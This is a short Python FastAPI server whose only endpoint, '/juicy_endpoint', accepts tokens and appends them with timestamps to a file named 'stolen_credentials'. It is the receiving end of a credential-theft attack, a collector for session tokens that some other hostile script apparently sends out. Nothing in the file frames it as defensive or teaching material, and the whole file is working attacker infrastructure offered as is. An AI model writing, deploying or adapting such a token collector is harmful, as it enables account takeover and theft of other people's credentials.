from fastapi import FastAPI
import uvicorn
from fastapi.middleware.cors import CORSMiddleware
import json
import datetime

app = FastAPI()


origins = [
    "http://localhost",
    "http://localhost:8080",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.post("/juicy_endpoint")
def juicy_endpoint(token: str):
    with open("stolen_credentials", "a") as file:
        file.write(datetime.datetime.now().strftime("%d-%m-%Y, %H:%M"))
        file.write("\n")
        file.write(token)
        file.write("\n\n")

    return json.dumps({'ok': True})


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=6969)

